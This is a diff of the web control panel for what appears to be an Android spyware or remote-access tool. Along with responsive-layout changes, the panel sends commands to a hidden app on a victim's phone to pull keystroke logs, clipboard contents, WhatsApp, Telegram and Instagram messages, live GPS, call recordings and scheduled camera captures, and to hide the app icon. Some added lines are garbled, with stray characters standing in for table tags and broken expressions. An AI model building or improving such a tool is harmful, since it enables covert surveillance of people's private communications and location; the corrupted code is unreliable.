@@ -37,6 +37,47 @@
             padding: 20px;
             overflow-y: auto;
             box-shadow: 2px 0 5px rgba(0,0,0,0.02);
+            transition: transform 0.3s ease;
+            z-index: 100;
+        }
+
+        /* Responsive: hide sidebar on small screens, show via hamburger */
+        @media (max-width: 768px) {
+            #sidebar {
+                position: fixed;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                transform: translateX(-100%);
+                z-index: 1000;
+                background: white;
+                box-shadow: 2px 0 10px rgba(0,0,0,0.1);
+            }
+            #sidebar.open {
+                transform: translateX(0);
+            }
+            .menu-toggle {
+                display: block;
+                position: fixed;
+                top: 15px;
+                left: 15px;
+                z-index: 1001;
+                background: #1976ff;
+                color: white;
+                border: none;
+                border-radius: 8px;
+                padding: 8px 12px;
+                cursor: pointer;
+                font-size: 18px;
+            }
+        }
+        @media (min-width: 769px) {
+            .menu-toggle {
+                display: none;
+            }
+        }
+
+        .menu-toggle {
             display: none;
         }
 
@@ -149,7 +190,6 @@
             flex-direction: column;
             min-width: 0;
             background: #f5f7fa;
-            display: none;
         }
 
         #header {
@@ -162,6 +202,7 @@
             padding: 0 25px;
             font-weight: 600;
             color: #1a2634;
+            position: relative;
         }
 
         #status {
@@ -230,6 +271,8 @@
             width: 100%;
             border-collapse: collapse;
             font-size: 14px;
+            overflow-x: auto;
+            display: block;
         }
 
         th {
@@ -252,148 +295,108 @@
             background: #f5f9ff;
         }
 
-      /* ==================== FILE MANAGER (TREE-VIEW) ==================== */
-.file-manager {
-    display: flex;
-    flex-direction: column;
-    height: 100%;
-    background: #ffffff; /* Or #0f0f0f if you prefer the dark theme from the video */
-}
+        /* ==================== FILE MANAGER (TREE-VIEW) ==================== */
+        .file-manager {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
 
-.file-toolbar-sticky {
-    position: sticky;
-    top: 0;
-    background: inherit;
-    z-index: 100;
-    padding: 12px;
-    border-bottom: 1px solid #eef2f5;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-}
+        .file-toolbar-sticky {
+            position: sticky;
+            top: 0;
+            background: white;
+            z-index: 100;
+            padding: 12px;
+            border-bottom: 1px solid #eef2f5;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
 
-.file-path {
-    background: #f0f2f5;
-    padding: 6px 14px;
-    border-radius: 6px;
-    font-size: 13px;
-    font-family: monospace;
-    color: #2c3e50;
-    flex: 1;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-}
+        .file-path {
+            background: #f0f2f5;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-family: monospace;
+            color: #2c3e50;
+            flex: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
 
-/* --- Tree Structure Containers --- */
-.tree-content {
-    flex: 1;
-    overflow-y: auto;
-    padding: 20px;
-}
+        .tree-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+        }
 
-.tree-root, .nested-tree {
-    list-style: none;
-    padding-left: 24px;
-    margin: 0;
-    position: relative;
-}
+        .tree-root, .nested-tree {
+            list-style: none;
+            padding-left: 24px;
+            margin: 0;
+            position: relative;
+        }
 
-/* Vertical Connecting Lines */
-.tree-root::before, .nested-tree::before {
-    content: "";
-    position: absolute;
-    top: 0;
-    left: 8px;
-    width: 1px;
-    height: 100%;
-    background: #d1d9e0; /* Subtle line color */
-}
+        .tree-root::before, .nested-tree::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 8px;
+            width: 1px;
+            height: 100%;
+            background: #d1d9e0;
+        }
 
-.tree-item {
-    position: relative;
-    margin: 4px 0;
-}
+        .tree-item {
+            position: relative;
+            margin: 4px 0;
+        }
 
-/* Horizontal Connecting Lines */
-.tree-item::before {
-    content: "";
-    position: absolute;
-    top: 15px;
-    left: -16px;
-    width: 16px;
-    height: 1px;
-    background: #d1d9e0;
-}
+        .tree-item::before {
+            content: "";
+            position: absolute;
+            top: 15px;
+            left: -16px;
+            width: 16px;
+            height: 1px;
+            background: #d1d9e0;
+        }
 
-/* --- Row Styles --- */
-.folder-header, .file-row {
-    display: flex;
-    align-items: center;
-    padding: 6px 10px;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: background 0.2s, transform 0.1s;
-}
+        .folder-header, .file-row {
+            display: flex;
+            align-items: center;
+            padding: 6px 10px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
 
-.folder-header:hover, .file-row:hover {
-    background: #f5f7fa;
-}
+        .folder-header:hover, .file-row:hover {
+            background: #f5f7fa;
+        }
 
-.folder-header:active, .file-row:active {
-    transform: scale(0.99);
-}
+        .folder-icon, .file-icon {
+            font-size: 18px;
+            margin-right: 10px;
+            display: inline-block;
+            width: 24px;
+            text-align: center;
+        }
 
-.folder-icon, .file-icon {
-    font-size: 18px;
-    margin-right: 10px;
-    display: inline-block;
-    width: 24px;
-    text-align: center;
-}
+        .item-name {
+            font-size: 14px;
+            color: #2c3e50;
+            flex: 1;
+        }
 
-.item-name {
-    font-size: 14px;
-    color: #2c3e50;
-    flex: 1;
-}
-
-.file-size {
-    font-size: 11px;
-    color: #94a3b8;
-    margin-left: 10px;
-}
-
-/* --- Checkbox Styling --- */
-.file-checkbox {
-    width: 16px;
-    height: 16px;
-    margin-right: 10px;
-    cursor: pointer;
-}
-
-/* --- Animation & Interactivity --- */
-.nested-tree {
-    max-height: 0;
-    overflow: hidden;
-    transition: max-height 0.3s ease-in-out, opacity 0.3s;
-    opacity: 0;
-}
-
-/* Toggle this class via JS to expand */
-.nested-tree.show {
-    max-height: 2000px; /* Large value to allow growth */
-    opacity: 1;
-}
-
-/* UI for empty folders */
-.empty-msg {
-    padding: 20px;
-    color: #94a3b8;
-    font-style: italic;
-    font-size: 13px;
-}
-
+        .file-size {
+            font-size: 11px;
+            color: #94a3b8;
+            margin-left: 10px;
+        }
 
         /* ==================== PAGINATION ==================== */
         .pagination {
@@ -695,6 +698,8 @@
     </style>
 </head>
 <body>
+
+<button class="menu-toggle" id="menuToggle">☰</button>
 
 <!-- AUTHENTICATION CONTAINER (login) -->
 <div id="authContainer">
@@ -1489,7 +1494,6 @@
         a.click();
     }
 
-    // FIXED: Added string parsing for location data
     function renderMap(loc) {
         let locationData = loc;
         if (typeof locationData === 'string') {
@@ -1537,9 +1541,9 @@
         const pageSize = 20, total = Math.ceil(rows.length/pageSize);
         const start = currentPage*pageSize;
         const pageRows = rows.slice(start, start+pageSize);
-        let html = '<table><thead><tr>' + headers.map(h=>`<th>${h}</th>`).join('') + '?</thead><tbody>';
-        pageRows.forEach(r => { html += '<tr>' + r.map(cell=>`<td>${cell||''}</td>`).join('') + '</tr>'; });
-        html += '</tbody></table>';
+        let html = '<table><thead>士' + headers.map(h=>`<th>${h}</th>`).join('') + '?</thead><tbody>';
+        pageRows.forEach(r => { html += '<tr>' + r.map(cell=>`<td>${cell||''}</td>`).join('') + '处'; });
+        html += '</tbody>麣';
         if (total>1) {
             html += '<div class="pagination">';
             for (let i=0; i<total; i++) html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
@@ -1550,9 +1554,6 @@
 
     function gotoPage(p) { currentPage = p; renderTable(); }
 
-    // File Manager – simple list (preserve tree by showing only current folder)
-    // When a folder is clicked, we replace the panel content with new list; the path is updated.
-    // This keeps the structure simple; to maintain a tree you'd need to store expanded state.
     function renderFiles() {
         const panel = document.getElementById('main-panel');
         if (!panel) return;
@@ -1628,82 +1629,86 @@
         updateCounters();
     }
 
-    // ==================== DATA DISPLAY FUNCTIONS ====================
-    // (All functions remain unchanged, but ensure they exist)
-    function displayContacts(data) {
-        panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
-        panel.innerHTML = `<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
-    }
-
-    function displayInstalledApps(data) {
-        panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📱 Apps</h3><p>No apps found.</p>'; return; }
-        panel.innerHTML = `<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
-        document.querySelectorAll('.open-app').forEach(btn => btn.onclick = () => sendCommand('OPEN_APP', { package: btn.dataset.pkg }));
-        document.querySelectorAll('.remove-app').forEach(btn => btn.onclick = () => sendCommand('UNINSTALL_APP', { package: btn.dataset.pkg }));
+    // ==================== MONITORING FUNCTIONS ====================
+    function showAppUsagePanel() {
+        panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device</p>';
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap';
+        [['Today', 1], ['7 Days', 7], ['30 Days', 30]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() { sendCommand('GET_APP_USAGE', { days: item[1] }); });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
     }
 
     function displayAppUsage(data) {
         panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>'; return; }
+        if (!Array.isArray(data) || !data.length) {
+            panel.innerHTML = '<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>';
+            return;
+        }
         const max = Math.max(...data.map(a=>a.totalTimeMs||0));
         panel.innerHTML = `<h3>📊 Screen Time (${data.length} apps)</h3><div>${data.map(app=>{ const t=app.totalTimeMs||0; const h=Math.floor(t/3600000), m=Math.floor((t%3600000)/60000); const pct = max?Math.round(t/max*100):0; return `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName||'Unknown')}</div><div class="app-usage-time">${h>0?`${h}h ${m}m`:m+'m'}</div><div style="flex:0.5;"><div class="usage-bar" style="width:${pct}%; background-color:${t>3600000?'#d32f2f':t>1800000?'#ff9800':'#4caf50'}"></div></div></div>`; }).join('')}</div>`;
     }
 
-    function displayNotifications(data) {
-        panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🔔 Notifications</h3><p>No notifications yet.</p>'; return; }
-        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>🔔 Notifications (${data.length})</h3><button id="clearNotifBtn">Clear</button></div>`;
-        data.slice().reverse().forEach(n => {
-            const card = document.createElement('div');
-            card.className = 'notification-card';
-            card.innerHTML = `<div><strong>${escapeHtml(n.app||n.packageName||'')}</strong> <small>${n.timeFmt||''}</small></div><div>${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
-            panel.appendChild(card);
-        });
-        document.getElementById('clearNotifBtn')?.addEventListener('click', () => sendCommand('CLEAR_NOTIFICATIONS'));
+    function showSocialMessagesPanel() {
+        panel.innerHTML = '<h3>💬 Social Messages</h3><div><button data-filter="ALL">All</button><button data-filter="com.whatsapp">WhatsApp</button><button data-filter="org.telegram.messenger">Telegram</button><button data-filter="com.instagram.android">Instagram</button></div><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="socialMsgList"></div>';
+        document.querySelectorAll('#socialMessagesPanel button[data-filter]').forEach(btn => btn.onclick = () => filterSocialByPkg(btn.dataset.filter));
+        document.querySelectorAll('#socialMessagesPanel button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_SOCIAL_MESSAGES', { days: parseInt(btn.dataset.days) }));
+        sendCommand('GET_SOCIAL_MESSAGES', { days: 1 });
     }
 
+    let socialMsgsData = [];
+    function displaySocialMessages(data) {
+        const container = document.getElementById('socialMsgList');
+        if (!container) return;
+        container.innerHTML = '';
+        let messages = data;
+        if (typeof data === 'string') try { messages = JSON.parse(data); } catch(e) { container.innerHTML = '<p>Error parsing messages</p>'; return; }
+        if (!Array.isArray(messages) || !messages.length) { container.innerHTML = '<p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
+        socialMsgsData = messages;
+        renderSocialMessages(messages);
+    }
+
+    function renderSocialMessages(data) {
+        const container = document.getElementById('socialMsgList');
+        if (!container) return;
+        container.innerHTML = '';
+        data.slice().reverse().forEach(n => {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
+            card.innerHTML = `<div style="display:flex;justify-content:space-between;"><span style="font-weight:700;color:#1976ff;">${escapeHtml(n.app||getAppNameFromPkg(n.pkg)||'Unknown')}</span><span style="color:#aaa;font-size:11px;">${n.timeFmt||''}</span></div><div style="font-weight:600;">${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
+            container.appendChild(card);
+        });
+    }
+    function getAppNameFromPkg(pkg) {
+        const map = { 'com.whatsapp':'WhatsApp', 'org.telegram.messenger':'Telegram', 'com.instagram.android':'Instagram', 'com.facebook.orca':'Messenger', 'com.facebook.katana':'Facebook', 'com.snapchat.android':'Snapchat', 'com.twitter.android':'Twitter', 'com.viber.voip':'Viber', 'com.skype.raider':'Skype' };
+        return map[pkg] || pkg;
+    }
+    function filterSocialByPkg(pkg) {
+        if (!socialMsgsData.length) return;
+        const filtered = pkg === 'ALL' ? socialMsgsData : socialMsgsData.filter(n => n.pkg === pkg || n.packageName === pkg);
+        renderSocialMessages(filtered);
+    }
+
+    function showKeylog() { sendCommand('GET_KEYLOG'); }
     function displayKeylog(data) {
         panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+        if (!Array.isArray(data) || !data.length) {
+            panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>';
+            return;
+        }
+        panel.innerHTML = `<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn">Clear</button></div><div style="overflow-x:auto;">`,tbl=document.createElement('table'); tbl.innerHTML = '<thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>' + data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('') + '</tbody>', panel.appendChild(tbl);
         document.getElementById('clearKeylogBtn')?.addEventListener('click', () => sendCommand('CLEAR_KEYLOG'));
     }
 
-    function displayBrowserHistory(data) {
-        panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-        panel.innerHTML = `<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
-    }
-
-    function displayWifiNetworks(data) {
-        panel.innerHTML = '';
-        if (!Array.isArray(data) || !data.length) { panel.innerHTML = '<h3>📶 Wi-Fi</h3><p>No networks found.</p>'; return; }
-        panel.innerHTML = `<h3>📶 Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars = n.rssi > -50 ? '████' : n.rssi > -70 ? '███░' : n.rssi > -80 ? '██░░' : '█░░░'; return `<tr style="${n.connected?'background:#f0fff4':''}"><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`;
-    }
-
+    function showClipboard() { sendCommand('GET_CLIPBOARD'); }
     function displayClipboard(data) {
         const content = data && data.content ? data.content : (data || '');
         panel.innerHTML = `<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data && data.type ? data.type : 'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div>`;
-    }
-
-    function toggleLiveGps() {
-        const btn = document.getElementById('liveGpsBtn');
-        if (!liveGpsActive) {
-            sendCommand('START_GPS_UPDATES');
-            liveGpsActive = true;
-            btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
-            btn.style.background = '#d32f2f';
-            btn.style.color = '#fff';
-            showNotification('Live GPS started');
-        } else {
-            sendCommand('STOP_GPS_UPDATES');
-            liveGpsActive = false;
-            btn.querySelector('span:last-child').textContent = 'Live GPS Track';
-            btn.style.cssText = '';
-            showNotification('GPS stopped');
-        }
     }
 
     function showGeofencePanel() {
@@ -1733,9 +1738,6 @@
         }, 100);
     }
 
-    function setGeofence() { /* dummy */ }
-    function useLocationAsGeofence(lat, lon) { sendCommand('SET_GEOFENCE', { lat, lon, radius: 500 }); showNotification('Geofence set'); }
-
     function showSchedulePanel() {
         panel.innerHTML = '<h3>⏱️ Auto Screenshot</h3><div><label>Interval (minutes): <input id="schedInterval" type="number" value="5" min="1"></label><label>Camera: <select id="schedCam"><option value="0">Rear</option><option value="1">Front</option></select></label><button id="startSched">Start</button><button id="stopSched">Stop</button></div>';
         document.getElementById('startSched').onclick = () => {
@@ -1746,16 +1748,22 @@
         document.getElementById('stopSched').onclick = () => sendCommand('STOP_SCHEDULED_CAPTURE');
     }
 
-    function startScheduledCapture() { /* dummy */ }
-
-    function showSendSmsPanel() {
-        panel.innerHTML = '<h3>✉️ Send SMS</h3><div><input id="smsNumber" placeholder="Phone Number"><textarea id="smsBody" rows="4" placeholder="Message"></textarea><button id="sendSmsBtn">Send</button></div>';
-        document.getElementById('sendSmsBtn').onclick = () => {
-            const number = document.getElementById('smsNumber').value.trim();
-            const body = document.getElementById('smsBody').value.trim();
-            if (!number || !body) return showNotification('Enter number and message');
-            sendCommand('SEND_SMS', { number, body });
-        };
+    function toggleLiveGps() {
+        const btn = document.getElementById('liveGpsBtn');
+        if (!liveGpsActive) {
+            sendCommand('START_GPS_UPDATES');
+            liveGpsActive = true;
+            btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
+            btn.style.background = '#d32f2f';
+            btn.style.color = '#fff';
+            showNotification('Live GPS started');
+        } else {
+            sendCommand('STOP_GPS_UPDATES');
+            liveGpsActive = false;
+            btn.querySelector('span:last-child').textContent = 'Live GPS Track';
+            btn.style.cssText = '';
+            showNotification('GPS stopped');
+        }
     }
 
     function showLocationHistoryPanel() {
@@ -1776,7 +1784,7 @@
             data.forEach((p,i) => L.circleMarker([p.lat,p.lon], { radius: i===0?8:5, color: i===0?'#d32f2f':'#1976ff', fillOpacity:0.8 }).addTo(window._historyMap).bindPopup(`<b>${p.timeFmt||''}</b><br>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}`));
             if (coords.length) window._historyMap.setView(coords[0],13);
         }
-        listDiv.innerHTML = `<table><thead><tr><th>Time</th><th>Location</th><th>Map</th></tr></thead><tbody>${data.map(p=>`<tr><td>${p.timeFmt||''}</td><td>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">📍</a></td></tr>`).join('')}</tbody></table>`;
+        listDiv.innerHTML = ``,tbl=document.createElement('table'); tbl.innerHTML = '<thead><tr><th>Time</th><th>Location</th><th>Map</th></tr></thead><tbody>' + data.map(p=>`<tr><td>${p.timeFmt||''}</td><td>${p.address||(p.lat.toFixed(4)+','+p.lon.toFixed(4))}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">📍</a></td></tr>`).join('') + '</tbody>', listDiv.appendChild(tbl);
     }
 
     function showCallRecordingsPanel() {
@@ -1833,8 +1841,6 @@
         });
     }
 
-    function showFullImage(b64, mediaId) { downloadBase64(b64, `photo_${mediaId||Date.now()}.jpg`); }
-
     function showAppEventsPanel() {
         panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="appEventsList"></div>';
         document.querySelectorAll('#appEventsPanel button').forEach(btn => btn.onclick = () => sendCommand('GET_APP_EVENTS', { days: parseInt(btn.dataset.days) }));
@@ -1884,69 +1890,6 @@
         data.forEach(alert => {
             div.innerHTML += `<div style="background:#fff8e1;border:1px solid #ffcc02;border-radius:8px;padding:10px;margin-bottom:8px;"><div style="display:flex;justify-content:space-between;"><span style="background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;">${escapeHtml(alert.keyword)}</span><span style="font-size:11px;">${alert.timeFmt||''}</span></div><div>From: ${escapeHtml(alert.from||'')}</div><div>${escapeHtml(alert.body||alert.message||'')}</div></div>`;
         });
-    }
-
-    function showSocialMessagesPanel() {
-        panel.innerHTML = '<h3>💬 Social Messages</h3><div><button data-filter="ALL">All</button><button data-filter="com.whatsapp">WhatsApp</button><button data-filter="org.telegram.messenger">Telegram</button><button data-filter="com.instagram.android">Instagram</button></div><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="socialMsgList"></div>';
-        document.querySelectorAll('#socialMessagesPanel button[data-filter]').forEach(btn => btn.onclick = () => filterSocialByPkg(btn.dataset.filter));
-        document.querySelectorAll('#socialMessagesPanel button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_SOCIAL_MESSAGES', { days: parseInt(btn.dataset.days) }));
-        sendCommand('GET_SOCIAL_MESSAGES', { days: 1 });
-    }
-
-    function displaySocialMessages(data) {
-        const container = document.getElementById('socialMsgList');
-        if (!container) return;
-        container.innerHTML = '';
-        let messages = data;
-        if (typeof data === 'string') try { messages = JSON.parse(data); } catch(e) { container.innerHTML = '<p>Error parsing messages</p>'; return; }
-        if (!Array.isArray(messages) || !messages.length) { container.innerHTML = '<p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
-        socialMsgsData = messages;
-        renderSocialMessages(messages);
-    }
-
-    let socialMsgsData = [];
-    function renderSocialMessages(data) {
-        const container = document.getElementById('socialMsgList');
-        if (!container) return;
-        container.innerHTML = '';
-        data.slice().reverse().forEach(n => {
-            const card = document.createElement('div');
-            card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
-            card.innerHTML = `<div style="display:flex;justify-content:space-between;"><span style="font-weight:700;color:#1976ff;">${escapeHtml(n.app||getAppNameFromPkg(n.pkg)||'Unknown')}</span><span style="color:#aaa;font-size:11px;">${n.timeFmt||''}</span></div><div style="font-weight:600;">${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
-            container.appendChild(card);
-        });
-    }
-    function getAppNameFromPkg(pkg) {
-        const map = { 'com.whatsapp':'WhatsApp', 'org.telegram.messenger':'Telegram', 'com.instagram.android':'Instagram', 'com.facebook.orca':'Messenger', 'com.facebook.katana':'Facebook', 'com.snapchat.android':'Snapchat', 'com.twitter.android':'Twitter', 'com.viber.voip':'Viber', 'com.skype.raider':'Skype' };
-        return map[pkg] || pkg;
-    }
-    function filterSocialByPkg(pkg) {
-        if (!socialMsgsData.length) return;
-        const filtered = pkg === 'ALL' ? socialMsgsData : socialMsgsData.filter(n => n.pkg === pkg || n.packageName === pkg);
-        renderSocialMessages(filtered);
-    }
-
-    function pushLiveNotification(json) {
-        pushAlert('📳 ' + (json.app||'App'), (json.title||'') + ': ' + (json.text||''));
-    }
-
-    function showFirebaseSettingsPanel() {
-        panel.innerHTML = '<h3>🔥 Firebase Configuration</h3><p>Enter your Firebase project config.</p><div id="fbForm"></div><button id="saveFb">Save & Connect</button><div id="fbStatus"></div>';
-        const fields = ['apiKey','authDomain','projectId','storageBucket','messagingSenderId','appId'];
-        const form = document.getElementById('fbForm');
-        fields.forEach(f => {
-            const wrap = document.createElement('div');
-            wrap.innerHTML = `<label>${f}</label><input id="fb_${f}" value="${CONFIG.FIREBASE_CONFIG[f]||''}" placeholder="${f}">`;
-            form.appendChild(wrap);
-        });
-        document.getElementById('saveFb').onclick = () => {
-            const cfg = {};
-            fields.forEach(f => cfg[f] = document.getElementById(`fb_${f}`).value.trim());
-            if (!cfg.projectId) return alert('Enter at least Project ID');
-            localStorage.setItem('fbConfig', JSON.stringify(cfg));
-            alert('Saved! Reload page to apply Firebase config.');
-        };
-        document.getElementById('fbStatus').innerHTML = CONFIG.FIREBASE_CONFIG.apiKey && CONFIG.FIREBASE_CONFIG.apiKey !== 'YOUR_API_KEY' ? '<span style="color:#4caf50;">● Firebase Connected</span>' : '<span style="color:#d32f2f;">● Not configured</span>';
     }
 
     function toggleAppIcon() { sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
@@ -2093,6 +2036,21 @@
         document.getElementById('reconnectBtn').addEventListener('click', manualReconnect);
         document.getElementById('clearAlertsBtn').addEventListener('click', clearAlerts);
         document.getElementById('logoutBtn').addEventListener('click', logout);
+    }
+
+    // Responsive: sidebar toggle
+    const menuToggle = document.getElementById('menuToggle');
+    const sidebar = document.getElementById('sidebar');
+    if (menuToggle) {
+        menuToggle.addEventListener('click', () => {
+            sidebar.classList.toggle('open');
+        });
+        // close sidebar when clicking outside on small screens
+        document.addEventListener('click', (e) => {
+            if (window.innerWidth <= 768 && sidebar.classList.contains('open') && !sidebar.contains(e.target) && !menuToggle.contains(e.target)) {
+                sidebar.classList.remove('open');
+            }
+        });
     }
 
     renderAuthForm();
